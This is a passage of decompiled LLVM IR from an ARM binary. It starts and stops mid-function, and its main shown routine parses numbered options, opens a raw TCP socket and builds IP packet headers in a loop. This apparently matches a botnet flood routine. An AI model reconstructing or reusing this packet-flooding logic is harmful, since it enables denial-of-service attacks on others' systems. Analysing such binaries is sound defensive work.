  %v3_bfe4 = and i32 %v1_bfd8, 65280
  store i32 %v3_bfe4, i32* %r2.global-to-local, align 4
  %v3_bfe8 = mul i32 %v3_bfc4, 16777216
  store i32 %v3_bfe8, i32* %ip.global-to-local, align 4
  %v1_bfec = add i32 %v2_bfdc, 20
  %v2_bfec = inttoptr i32 %v1_bfec to i8*
  %v3_bfec = load i8, i8* %v2_bfec, align 1
  %v4_bfec = zext i8 %v3_bfec to i32
  %v4_bff0 = mul nuw nsw i32 %v1_bfe0, 256
  %v5_bff0 = or i32 %v4_bff0, %v3_bfe8
  store i32 %v5_bff0, i32* %ip.global-to-local, align 4
  %v2_bff8 = call i32 @llvm.bswap.i32(i32 %v3_bfc4)
  %v7_bffc = lshr i32 %v0_bfc8, %v4_bfec
  %v8_bffc = add i32 %v7_bffc, %v2_bff8
  store i32 %v8_bffc, i32* %r2.global-to-local, align 4
  %v2_c018 = call i32 @llvm.bswap.i32(i32 %v8_bffc)
  store i32 %v2_c018, i32* %r3.global-to-local, align 4
  store i32 %v6_bb6c, i32* %r1.global-to-local, align 4
  store i1 %v3_c020, i1* %cpsr_z.global-to-local, align 1
  %v1_c024 = load i32, i32* @r5, align 4
  %v2_c024 = add i32 %v1_c024, 16
  %v3_c024 = inttoptr i32 %v2_c024 to i32*
  store i32 %v2_c018, i32* %v3_c024, align 4
  br i1 %v3_c020, label %dec_label_pc_c02c, label %dec_label_pc_bec0

dec_label_pc_c02c:                                ; preds = %dec_label_pc_bfc4, %dec_label_pc_beb4
  %v0_c02c = call i32 @function_f6c4()
  store i32 %v3_bbc8, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c03c, i1* %cpsr_z.global-to-local, align 1
  %v1_c040 = load i32, i32* @r5, align 4
  %v2_c040 = add i32 %v1_c040, 12
  %v3_c040 = inttoptr i32 %v2_c040 to i32*
  store i32 %v0_c02c, i32* %v3_c040, align 4
  br i1 %v3_c03c, label %dec_label_pc_c048, label %dec_label_pc_c02c.dec_label_pc_bed4_crit_edge

dec_label_pc_c02c.dec_label_pc_bed4_crit_edge:    ; preds = %dec_label_pc_c02c
  %v1_bed8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bed4

dec_label_pc_c048:                                ; preds = %dec_label_pc_c02c, %dec_label_pc_bec0
  %v0_c048 = call i32 @function_f6c4()
  %v1_c048 = trunc i32 %v0_c048 to i8
  %v4_c04c31 = udiv i32 %v0_c048, 256
  %v1_c050 = trunc i32 %v4_c04c31 to i8
  %v2_c050 = load i32, i32* @r5, align 4
  %v3_c050 = add i32 %v2_c050, 5
  %v4_c050 = inttoptr i32 %v3_c050 to i8*
  store i8 %v1_c050, i8* %v4_c050, align 1
  store i32 %v3_bbcc, i32* %r3.global-to-local, align 4
  %v1_c058 = load i32, i32* @r4, align 4
  %v9_c058 = icmp eq i32 %v3_bbcc, %v1_c058
  store i1 %v9_c058, i1* %cpsr_z.global-to-local, align 1
  %v3_c05c = load i32, i32* @r5, align 4
  %v4_c05c = add i32 %v3_c05c, 4
  %v5_c05c = inttoptr i32 %v4_c05c to i8*
  store i8 %v1_c048, i8* %v5_c05c, align 1
  %v0_c060 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c060, label %dec_label_pc_c064, label %dec_label_pc_c048.dec_label_pc_bee0_crit_edge

dec_label_pc_c048.dec_label_pc_bee0_crit_edge:    ; preds = %dec_label_pc_c048
  %v1_bee4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bee0

dec_label_pc_c064:                                ; preds = %dec_label_pc_c048, %dec_label_pc_bed4
  %v0_c064 = call i32 @function_f6c4()
  %v1_c064 = trunc i32 %v0_c064 to i8
  store i32 %v3_bbd0, i32* %ip.global-to-local, align 4
  %v4_c06c = sdiv i32 %v0_c064, 256
  store i32 %v4_c06c, i32* %r3.global-to-local, align 4
  %v1_c070 = load i32, i32* @r4, align 4
  %v9_c070 = icmp eq i32 %v3_bbd0, %v1_c070
  store i1 %v9_c070, i1* %cpsr_z.global-to-local, align 1
  %v3_c074 = load i32, i32* @r5, align 4
  %v4_c074 = add i32 %v3_c074, 20
  %v5_c074 = inttoptr i32 %v4_c074 to i8*
  store i8 %v1_c064, i8* %v5_c074, align 1
  %v0_c078 = load i32, i32* %r3.global-to-local, align 4
  %v1_c078 = trunc i32 %v0_c078 to i8
  %v2_c078 = load i32, i32* @r6, align 4
  %v3_c078 = add i32 %v2_c078, 1
  %v4_c078 = inttoptr i32 %v3_c078 to i8*
  store i8 %v1_c078, i8* %v4_c078, align 1
  %v0_c07c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c07c, label %dec_label_pc_c080, label %dec_label_pc_c064.dec_label_pc_beec_crit_edge

dec_label_pc_c064.dec_label_pc_beec_crit_edge:    ; preds = %dec_label_pc_c064
  %v1_bef0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_beec

dec_label_pc_c080:                                ; preds = %dec_label_pc_c064, %dec_label_pc_bee0
  %v0_c080 = call i32 @function_f6c4()
  %v1_c080 = trunc i32 %v0_c080 to i8
  store i32 %v6_ba6c, i32* %r1.global-to-local, align 4
  %v4_c088 = sdiv i32 %v0_c080, 256
  store i32 %v4_c088, i32* %r3.global-to-local, align 4
  %v1_c08c = load i32, i32* @r4, align 4
  %v9_c08c = icmp eq i32 %v6_ba6c, %v1_c08c
  store i1 %v9_c08c, i1* %cpsr_z.global-to-local, align 1
  %v1_c090 = trunc i32 %v4_c088 to i8
  %v2_c090 = load i32, i32* @r6, align 4
  %v3_c090 = add i32 %v2_c090, 3
  %v4_c090 = inttoptr i32 %v3_c090 to i8*
  store i8 %v1_c090, i8* %v4_c090, align 1
  %v3_c094 = load i32, i32* @r6, align 4
  %v4_c094 = add i32 %v3_c094, 2
  %v5_c094 = inttoptr i32 %v4_c094 to i8*
  store i8 %v1_c080, i8* %v5_c094, align 1
  %v0_c098 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c098, label %dec_label_pc_c09c, label %dec_label_pc_c080.dec_label_pc_bef8_crit_edge

dec_label_pc_c080.dec_label_pc_bef8_crit_edge:    ; preds = %dec_label_pc_c080
  %v1_befc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bef8

dec_label_pc_c09c:                                ; preds = %dec_label_pc_c080, %dec_label_pc_beec
  %v0_c09c = call i32 @function_f6c4()
  store i32 %v6_ba88, i32* %r2.global-to-local, align 4
  %v1_c0a4 = load i32, i32* @r4, align 4
  %v9_c0a4 = icmp eq i32 %v6_ba88, %v1_c0a4
  store i1 %v9_c0a4, i1* %cpsr_z.global-to-local, align 1
  %v1_c0a8 = load i32, i32* @r6, align 4
  %v2_c0a8 = add i32 %v1_c0a8, 4
  %v3_c0a8 = inttoptr i32 %v2_c0a8 to i32*
  store i32 %v0_c09c, i32* %v3_c0a8, align 4
  br i1 %v9_c0a4, label %dec_label_pc_c0b0, label %dec_label_pc_bf04

dec_label_pc_c0b0:                                ; preds = %dec_label_pc_c09c, %dec_label_pc_bef8
  %v0_c0b0 = call i32 @function_f6c4()
  store i32 %v1_bb58, i32* %r3.global-to-local, align 4
  store i1 %v2_c0b8, i1* %cpsr_z.global-to-local, align 1
  %v1_c0bc = load i32, i32* @r6, align 4
  %v2_c0bc = add i32 %v1_c0bc, 8
  %v3_c0bc = inttoptr i32 %v2_c0bc to i32*
  store i32 %v0_c0b0, i32* %v3_c0bc, align 4
  br i1 %v2_c0b8, label %dec_label_pc_bf10, label %dec_label_pc_c0c4

dec_label_pc_c0c4:                                ; preds = %dec_label_pc_bf04, %dec_label_pc_c0b0
  %v0_c0c4 = load i32, i32* @r5, align 4
  %v1_c0c4 = add i32 %v0_c0c4, 40
  store i32 %v6_bb30, i32* @r1, align 4
  %v1_c0cc = inttoptr i32 %v1_c0c4 to i8*
  %v2_c0cc = call i32 @function_f844(i8* %v1_c0cc)
  br label %dec_label_pc_bf10

dec_label_pc_c0d4:                                ; preds = %dec_label_pc_bbb8
  store i32 %v6_bb30, i32* %r3.global-to-local, align 4
  %v1_c0dc = add i32 %v6_bb30, 40
  store i32 %v1_c0dc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_be68.preheader

; uselistorder directives
  uselistorder i32 %v1_c0dc, { 1, 0 }
  uselistorder i32 %v4_c088, { 1, 0 }
  uselistorder i32 %v2_c018, { 1, 0 }
  uselistorder i32 %v3_bfe8, { 1, 0 }
  uselistorder i32 %v3_bfc4, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_bfa4, { 1, 2, 0 }
  uselistorder i32 %v1_bfa0, { 2, 0, 3, 1 }
  uselistorder i32 %v0_bf30, { 1, 0, 2 }
  uselistorder i32 %v0_be74, { 2, 0, 1 }
  uselistorder i32 %v0_be68, { 1, 0 }
  uselistorder i1 %v2_c0b8, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c03c, { 1, 0, 2, 3 }
  uselistorder i1 %v3_c020, { 3, 2, 1, 0 }
  uselistorder i32 %v1_be50, { 1, 0, 2, 3 }
  uselistorder i8 %v5_bcb4, { 1, 0 }
  uselistorder i32 %v1_bc7c, { 1, 0 }
  uselistorder i32 %v1_bc78, { 1, 0 }
  uselistorder i32 %v1_bc74, { 1, 0 }
  uselistorder i32 %v1_bc50, { 1, 0 }
  uselistorder i32 %v1_bc4c, { 1, 0 }
  uselistorder i32 %v1_bc48, { 1, 0 }
  uselistorder i32 %v1_bc3c, { 1, 0 }
  uselistorder i32 %v1_bc18, { 1, 0 }
  uselistorder i32 %v1_bc08, { 1, 0 }
  uselistorder i32 %v1_bbf4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_bbd4, { 1, 0, 2 }
  uselistorder i32 %v3_bbc8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bbbc, { 3, 0, 1, 2 }
  uselistorder i32 %v0_bbb8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_bb80, { 1, 2, 0, 3 }
  uselistorder i32 %v6_bb6c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_bb58, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bb30, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_ba88, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_ba6c, { 2, 5, 4, 3, 1, 0, 6 }
  uselistorder i32 %v1_ba1c, { 1, 2, 0 }
  uselistorder i32 %v5_ba10, { 0, 2, 1 }
  uselistorder i32 %v6_b9b4, { 1, 2, 0 }
  uselistorder i32 %v4_b99c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_b980, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 49, 50, 52, 53, 54, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 18, 19, 20, 21, 22, 9, 10, 11, 12, 13, 14 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 27, 28, 29, 30, 24, 25, 26 }
  uselistorder label %dec_label_pc_c0c4, { 1, 0 }
  uselistorder label %dec_label_pc_bfbc, { 1, 0 }
  uselistorder label %dec_label_pc_bf10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_be68.preheader, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c0f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c0f0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c0f0 = load i32, i32* @r4, align 4
  %v6_c0f0 = load i32, i32* @r5, align 4
  %v9_c0f0 = load i32, i32* @r6, align 4
  %v12_c0f0 = load i32, i32* @r7, align 4
  %v1_c0f4 = urem i32 %arg1, 256
  store i32 %v1_c0f4, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_c0f4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c10c = urem i32 %arg3, 256
  store i32 %v1_c10c, i32* @r4, align 4
  %v2_c110 = call i32* @calloc(i32 %v1_c0f4, i32 4)
  %v3_c110 = ptrtoint i32* %v2_c110 to i32
  %v0_c114 = load i32, i32* @r5, align 4
  store i32 %v0_c114, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v3_c110, i32* %fp.global-to-local, align 4
  %v0_c124 = load i32, i32* @r4, align 4
  store i32 %v0_c124, i32* %r0.global-to-local, align 4
  %v5_c128 = inttoptr i32 %v0_c114 to i32*
  %v6_c128 = call i32 @function_930c(i32 %v0_c124, i32* %v5_c128, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_c134 = urem i32 %v6_c128, 256
  store i32 %v1_c134, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c140 = load i32, i32* @r5, align 4
  store i32 %v0_c140, i32* %r1.global-to-local, align 4
  %v0_c144 = load i32, i32* @r4, align 4
  store i32 %v0_c144, i32* %r0.global-to-local, align 4
  %v5_c148 = trunc i32 %v6_c128 to i8
  %v6_c14c = inttoptr i32 %v0_c140 to i32*
  %v7_c14c = call i32 @function_930c(i32 %v0_c144, i32* %v6_c14c, i32 3, i32 65535, i32 %v6_c128)
  %v0_c150 = load i32, i32* @r5, align 4
  store i32 %v0_c150, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c160 = load i32, i32* @r4, align 4
  store i32 %v0_c160, i32* %r0.global-to-local, align 4
  %v5_c164 = inttoptr i32 %v0_c150 to i32*
  %v6_c164 = call i32 @function_930c(i32 %v0_c160, i32* %v5_c164, i32 4, i32 64, i32 %v7_c14c)
  %v1_c16c = urem i32 %v6_c164, 256
  store i32 %v1_c16c, i32* %ip.global-to-local, align 4
  %v0_c170 = load i32, i32* @r5, align 4
  store i32 %v0_c170, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c17c = load i32, i32* @r4, align 4
  store i32 %v0_c17c, i32* %r0.global-to-local, align 4
  %sext10 = mul i32 %v6_c164, 16777216
  %v5_c184 = sdiv i32 %sext10, 16777216
  %v6_c184 = inttoptr i32 %v0_c170 to i32*
  %v7_c184 = call i32 @function_930c(i32 %v0_c17c, i32* %v6_c184, i32 5, i32 1, i32 %v5_c184)
  %v1_c190 = urem i32 %v7_c184, 256
  store i32 %v1_c190, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c19c = load i32, i32* @r5, align 4
  store i32 %v0_c19c, i32* %r1.global-to-local, align 4
  %v0_c1a0 = load i32, i32* @r4, align 4
  store i32 %v0_c1a0, i32* %r0.global-to-local, align 4
  %v5_c1a8 = inttoptr i32 %v0_c19c to i32*
  %v6_c1a8 = call i32 @function_930c(i32 %v0_c1a0, i32* %v5_c1a8, i32 6, i32 65535, i32 %v1_c190)
  %v0_c1b0 = load i32, i32* @r5, align 4
  store i32 %v0_c1b0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c1a8, i32* @r7, align 4
  %v0_c1c0 = load i32, i32* @r4, align 4
  store i32 %v0_c1c0, i32* %r0.global-to-local, align 4
  %v5_c1c4 = inttoptr i32 %v0_c1b0 to i32*
  %v6_c1c4 = call i32 @function_930c(i32 %v0_c1c0, i32* %v5_c1c4, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_c1cc = load i32, i32* @r5, align 4
  store i32 %v0_c1cc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_c1c4, i32* @r6, align 4
  %v0_c1dc = load i32, i32* @r4, align 4
  store i32 %v0_c1dc, i32* %r0.global-to-local, align 4
  %v5_c1e0 = inttoptr i32 %v0_c1cc to i32*
  %v6_c1e0 = call i32 @function_930c(i32 %v0_c1dc, i32* %v5_c1e0, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_c1e4 = load i32, i32* @r5, align 4
  store i32 %v0_c1e4, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c1f4 = load i32, i32* @r4, align 4
  store i32 %v0_c1f4, i32* %r0.global-to-local, align 4
  %v5_c1f8 = inttoptr i32 %v0_c1e4 to i32*
  %v6_c1f8 = call i32 @function_930c(i32 %v0_c1f4, i32* %v5_c1f8, i32 18, i32 0, i32 %v6_c1e0)
  %v0_c1fc = load i32, i32* @r5, align 4
  store i32 %v0_c1fc, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c20c = load i32, i32* @r4, align 4
  store i32 %v0_c20c, i32* %r0.global-to-local, align 4
  %v5_c210 = inttoptr i32 %v0_c1fc to i32*
  %v6_c210 = call i32 @function_930c(i32 %v0_c20c, i32* %v5_c210, i32 11, i32 0, i32 %v6_c1f8)
  %v0_c214 = load i32, i32* @r5, align 4
  store i32 %v0_c214, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c224 = load i32, i32* @r4, align 4
  store i32 %v0_c224, i32* %r0.global-to-local, align 4
  %v5_c228 = inttoptr i32 %v0_c214 to i32*
  %v6_c228 = call i32 @function_930c(i32 %v0_c224, i32* %v5_c228, i32 12, i32 0, i32 %v6_c210)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c23c = load i32, i32* @r4, align 4
  store i32 %v0_c23c, i32* %r0.global-to-local, align 4
  %v5_c240 = inttoptr i32 %v0_c22c to i32*
  %v6_c240 = call i32 @function_930c(i32 %v0_c23c, i32* %v5_c240, i32 13, i32 0, i32 %v6_c228)
  %v0_c244 = load i32, i32* @r5, align 4
  store i32 %v0_c244, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c254 = load i32, i32* @r4, align 4
  store i32 %v0_c254, i32* %r0.global-to-local, align 4
  %v5_c258 = inttoptr i32 %v0_c244 to i32*
  %v6_c258 = call i32 @function_930c(i32 %v0_c254, i32* %v5_c258, i32 14, i32 0, i32 %v6_c240)
  %v0_c25c = load i32, i32* @r5, align 4
  store i32 %v0_c25c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c26c = load i32, i32* @r4, align 4
  store i32 %v0_c26c, i32* %r0.global-to-local, align 4
  %v5_c270 = inttoptr i32 %v0_c25c to i32*
  %v6_c270 = call i32 @function_930c(i32 %v0_c26c, i32* %v5_c270, i32 15, i32 1, i32 %v6_c258)
  %v0_c274 = load i32, i32* @r5, align 4
  store i32 %v0_c274, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c284 = load i32, i32* @r4, align 4
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  %v5_c288 = inttoptr i32 %v0_c274 to i32*
  %v6_c288 = call i32 @function_930c(i32 %v0_c284, i32* %v5_c288, i32 16, i32 0, i32 %v6_c270)
  %v2_c294 = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_c294, i32* %r3.global-to-local, align 4
  %v0_c298 = load i32, i32* @r5, align 4
  store i32 %v0_c298, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c2a0 = load i32, i32* @r4, align 4
  store i32 %v0_c2a0, i32* %r0.global-to-local, align 4
  %v5_c2a4 = inttoptr i32 %v0_c298 to i32*
  %v6_c2a4 = call i32 @function_92a0(i32 %v0_c2a0, i32* %v5_c2a4, i32 25, i32 %v2_c294, i32 %v6_c288)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c2b8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c2b8, i32* %r0.global-to-local, align 4
  %v2_c2bc = icmp eq i32 %v3_c2b8, -1
  store i1 %v2_c2bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c2b8, i32* %sb.global-to-local, align 4
  br i1 %v2_c2bc, label %dec_label_pc_c830, label %dec_label_pc_c2c8

dec_label_pc_c2c8:                                ; preds = %dec_label_pc_c0f0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c2d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c2d0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c2e4 = call i32 @setsockopt(i32 0, i32 3, i32 %v6_c2d0, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_c2e4, i32* %r0.global-to-local, align 4
  %v2_c2e8 = icmp eq i32 %v6_c2e4, -1
  store i1 %v2_c2e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c2e8, label %dec_label_pc_c828, label %dec_label_pc_c2f0

dec_label_pc_c2f0:                                ; preds = %dec_label_pc_c2c8
  %v3_c2f4 = mul i32 %v7_c14c, 65536
  store i32 %v3_c2f4, i32* %r4.global-to-local, align 4
  %v3_c2f8 = urem i32 %v7_c14c, 65536
  %v0_c308 = load i32, i32* @r7, align 4
  %v3_c308 = mul i32 %v0_c308, 65536
  store i32 %v3_c308, i32* %r0.global-to-local, align 4
  %v0_c30c = load i32, i32* @r6, align 4
  %v3_c30c = mul i32 %v0_c30c, 65536
  store i32 %v3_c30c, i32* %r5.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_c314 = urem i32 %v0_c308, 65536
  store i32 %v3_c314, i32* %ip.global-to-local, align 4
  %v3_c318 = urem i32 %v0_c30c, 65536
  store i32 %v3_c318, i32* %r2.global-to-local, align 4
  %v1_c31c = urem i32 %v6_c210, 256
  store i32 %v1_c31c, i32* %r3.global-to-local, align 4
  %v0_c320 = load i32, i32* @sl, align 4
  %v2_c320 = icmp eq i32 %v0_c320, 0
  store i1 %v2_c320, i1* %cpsr_z.global-to-local, align 1
  %tmp70 = icmp slt i32 %v0_c320, 1
  br i1 %tmp70, label %dec_label_pc_c5d4, label %dec_label_pc_c334

dec_label_pc_c334:                                ; preds = %dec_label_pc_c2f0
  %v1_c34c = urem i32 %v0_c30c, 256
  %tmp71 = udiv i32 %v0_c308, 256
  %v3_c350 = urem i32 %tmp71, 256
  %v1_c354 = urem i32 %v0_c308, 256
  %v4_c358 = mul nuw nsw i32 %v1_c354, 256
  %v5_c358 = or i32 %v4_c358, %v3_c350
  store i32 %v5_c358, i32* %r7.global-to-local, align 4
  %tmp72 = udiv i32 %v7_c14c, 256
  %tmp73 = mul i32 %v6_c1e0, 256
  %v1_c374 = and i32 %tmp73, 65280
  %v1_c378 = urem i32 %v6_c210, 2
  %v3_c37c = mul nuw nsw i32 %v1_c34c, 256
  store i32 %v3_c37c, i32* %r1.global-to-local, align 4
  %v5_c380 = trunc i32 %tmp72 to i8
  %tmp74 = udiv i32 %v0_c30c, 256
  %v4_c384 = urem i32 %tmp74, 256
  %v5_c384 = or i32 %v4_c384, %v3_c37c
  store i32 %v5_c384, i32* %r6.global-to-local, align 4
  %v1_c388 = urem i32 %v6_c228, 2
  %v1_c38c = urem i32 %v6_c240, 2
  %tmp75 = udiv i32 %v6_c1e0, 256
  %v4_c390 = urem i32 %tmp75, 256
  %v5_c390 = or i32 %v4_c390, %v1_c374
  store i32 %v5_c390, i32* %r5.global-to-local, align 4
  %v1_c3b0 = urem i32 %v6_c258, 2
  %v1_c3b4 = urem i32 %v6_c270, 2
  %v1_c3c0 = urem i32 %v6_c288, 2
  store i32 %v1_c3c0, i32* %r0.global-to-local, align 4
  %v3_c3c4 = udiv i32 %v7_c14c, 65536
  store i32 %v3_c3c4, i32* %r2.global-to-local, align 4
  store i32 %v1_c354, i32* %r3.global-to-local, align 4
  store i32 %v1_c34c, i32* %ip.global-to-local, align 4
  %v5_c3dc = trunc i32 %v0_c30c to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %tmp = sub nsw i32 0, %v1_c378
  %v4_c4a0 = and i32 %tmp, 32
  %tmp78 = sub nsw i32 0, %v1_c388
  %v4_c4b4 = and i32 %tmp78, 16
  %tmp79 = sub nsw i32 0, %v1_c38c
  %v4_c4c8 = and i32 %tmp79, 8
  %tmp80 = sub nsw i32 0, %v1_c3b0
  %v4_c4dc = and i32 %tmp80, 4
  %tmp81 = sub nsw i32 0, %v1_c3b4
  %v3_c4f0 = and i32 %tmp81, 2
  %v7_c520 = sext i8 %v5_c3dc to i32
  %sext = mul i32 %v0_c308, 16777216
  %v3_c520 = sdiv i32 %sext, 16777216
  br label %dec_label_pc_c3e4

dec_label_pc_c3e4:                                ; preds = %bb77, %dec_label_pc_c334
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c3ec = call i32* @calloc(i32 128, i32 1)
  %v4_c3ec = ptrtoint i32* %v2_c3ec to i32
  store i32 %v4_c3ec, i32* %r0.global-to-local, align 4
  %v3_c3f0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c3f0, i32* %r2.global-to-local, align 4
  %v1_c3f4 = load i32, i32* %fp.global-to-local, align 4
  %v2_c3f4 = load i32, i32* %r4.global-to-local, align 4
  %v5_c3f4 = mul i32 %v2_c3f4, 4
  %v6_c3f4 = add i32 %v5_c3f4, %v1_c3f4
  %v7_c3f4 = inttoptr i32 %v6_c3f4 to i32*
  store i32 %v4_c3ec, i32* %v7_c3f4, align 4
  %v0_c3f8 = load i32, i32* %fp.global-to-local, align 4
  %v1_c3f8 = load i32, i32* %r2.global-to-local, align 4
  %v4_c3f8 = mul i32 %v1_c3f8, 4
  %v5_c3f8 = add i32 %v4_c3f8, %v0_c3f8
  %v6_c3f8 = inttoptr i32 %v5_c3f8 to i32*
  %v7_c3f8 = load i32, i32* %v6_c3f8, align 4
  store i32 %v7_c3f8, i32* %r4.global-to-local, align 4
  %v1_c3fc = inttoptr i32 %v7_c3f8 to i8*
  %v2_c3fc = load i8, i8* %v1_c3fc, align 1
  %tmp82 = urem i8 %v2_c3fc, 16
  %v1_c400 = zext i8 %tmp82 to i32
  %v1_c404 = or i32 %v1_c400, 64
  store i32 %v1_c404, i32* %r3.global-to-local, align 4
  %v1_c408 = trunc i32 %v1_c404 to i8
  store i8 %v1_c408, i8* %v1_c3fc, align 1
  %v0_c40c = load i32, i32* %r4.global-to-local, align 4
  %v1_c40c = inttoptr i32 %v0_c40c to i8*
  %v2_c40c = load i8, i8* %v1_c40c, align 1
  %v1_c410 = and i8 %v2_c40c, -16
  %v1_c414 = or i8 %v1_c410, 5
  store i32 %v1_c190, i32* %r0.global-to-local, align 4
  store i8 %v1_c414, i8* %v1_c40c, align 1
  %v2_c424 = load i32, i32* %r4.global-to-local, align 4
